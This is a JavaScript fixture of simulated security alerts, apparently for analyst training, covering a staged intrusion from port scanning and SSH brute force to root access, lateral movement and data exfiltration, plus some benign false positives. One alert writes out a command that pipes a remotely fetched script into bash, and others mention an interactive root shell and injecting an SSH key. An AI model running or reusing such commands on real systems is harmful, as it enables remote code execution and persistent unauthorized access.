/** @typedef {{ id:string, time:string, sev:string, rule:string, src:string, dst:string, detail:string, host:string }} Alert */

/** @type {Alert[]} */
export const SAMPLE_ALERTS = [
  // Reconnaissance
  {id:"A001",time:"09:47:23",sev:"LOW",     rule:"Network Scan Detected",      src:"185.220.101.45",dst:"10.0.1.0/24", detail:"Nmap SYN scan — 1024 ports in 12s",                   host:"FIREWALL-01"},
  {id:"A002",time:"09:47:31",sev:"LOW",     rule:"Port Sweep",                 src:"185.220.101.45",dst:"10.0.1.15",  detail:"Sequential TCP sweep ports 1–65535",                   host:"IDS-SENSOR-01"},
  {id:"A003",time:"09:47:52",sev:"LOW",     rule:"OS Fingerprint Attempt",     src:"185.220.101.45",dst:"10.0.1.15",  detail:"TTL-based OS detection attempt",                       host:"IDS-SENSOR-01"},
  // Brute Force
  {id:"A004",time:"09:52:11",sev:"MEDIUM",  rule:"SSH Brute Force",            src:"185.220.101.45",dst:"10.0.1.15",  detail:"47 failed SSH attempts in 5 minutes",                 host:"LINUX-WEB-01"},
  {id:"A005",time:"09:52:45",sev:"MEDIUM",  rule:"Credential Spray",           src:"185.220.101.45",dst:"10.0.1.15",  detail:"Dict attack: root, admin, ubuntu, svc_deploy",         host:"AD-SERVER-01"},
  {id:"A006",time:"09:53:19",sev:"MEDIUM",  rule:"Auth Anomaly",               src:"185.220.101.45",dst:"10.0.1.15",  detail:"52 auth failures across 3 accounts",                  host:"AD-SERVER-01"},
  // Compromise
  {id:"A007",time:"09:54:17",sev:"CRITICAL",rule:"Brute Force Success",        src:"185.220.101.45",dst:"10.0.1.15",  detail:"SSH SUCCESS for svc_deploy after 52 failures",         host:"LINUX-WEB-01"},
  // Privilege Escalation
  {id:"A008",time:"09:55:33",sev:"CRITICAL",rule:"Privilege Escalation",       src:"10.0.1.15",    dst:"local",       detail:"sudo su - executed; root shell obtained",              host:"LINUX-WEB-01"},
  {id:"A009",time:"09:55:41",sev:"CRITICAL",rule:"Root Shell Spawned",         src:"10.0.1.15",    dst:"local",       detail:"/bin/bash -i as root from svc_deploy process tree",    host:"LINUX-WEB-01"},
  // Persistence
  {id:"A010",time:"09:56:05",sev:"HIGH",    rule:"Malicious Cron Created",     src:"10.0.1.15",    dst:"local",       detail:"curl http://185.220.101.45/beacon.sh | bash",          host:"LINUX-WEB-01"},
  {id:"A011",time:"09:56:12",sev:"HIGH",    rule:"SSH Key Injected",           src:"10.0.1.15",    dst:"local",       detail:"Unauthorized key → /root/.ssh/authorized_keys",        host:"LINUX-WEB-01"},
  // Lateral Movement
  {id:"A012",time:"09:58:44",sev:"HIGH",    rule:"Lateral Movement",           src:"10.0.1.15",    dst:"10.0.2.0/24", detail:"SSH attempts to 14 internal hosts",                   host:"NET-SENSOR-02"},
  {id:"A013",time:"09:59:12",sev:"HIGH",    rule:"Internal Host Compromise",   src:"10.0.1.15",    dst:"10.0.2.45",  detail:"SSH success to DB-SERVER-02 via reused credentials",   host:"DB-SERVER-02"},
  // Collection & Exfiltration
  {id:"A014",time:"09:59:55",sev:"CRITICAL",rule:"Anomalous DB Query Volume",  src:"10.0.2.45",    dst:"local",       detail:"root user: SELECT * on customers — 2.3M rows returned",host:"DB-SERVER-02"},
  {id:"A015",time:"10:02:33",sev:"CRITICAL",rule:"Large Data Exfiltration",    src:"10.0.2.45",    dst:"91.108.4.12", detail:"4.7 GB outbound transfer to known C2 over port 443",  host:"FIREWALL-01"},
  {id:"A016",time:"10:03:01",sev:"HIGH",    rule:"C2 Beacon Detected",         src:"10.0.1.15",    dst:"91.108.4.12", detail:"Periodic callback every 60s — beacon.sh C2 channel",  host:"IDS-SENSOR-01"},
  // False Positives
  {id:"A017",time:"09:50:00",sev:"LOW",     rule:"Scheduled Backup Job",       src:"10.0.5.10",    dst:"10.0.5.20",  detail:"Daily rsync backup — expected 09:45–10:15 window",    host:"BACKUP-SERVER"},
  {id:"A018",time:"09:51:30",sev:"LOW",     rule:"AV Signature Update",        src:"10.0.0.1",     dst:"10.0.1.0/24", detail:"CrowdStrike signature push to all endpoints",         host:"AV-MGMT-01"},
  {id:"A019",time:"10:00:00",sev:"LOW",     rule:"Patch Management Scan",      src:"10.0.0.5",     dst:"10.0.0.0/16", detail:"WSUS vulnerability scan — scheduled maintenance",     host:"WSUS-SERVER"},
  {id:"A020",time:"10:01:00",sev:"LOW",     rule:"DNS Lookup Spike",           src:"10.0.3.15",    dst:"8.8.8.8",    detail:"Dev machine — npm install / package resolution",      host:"DEV-WS-015"},
];
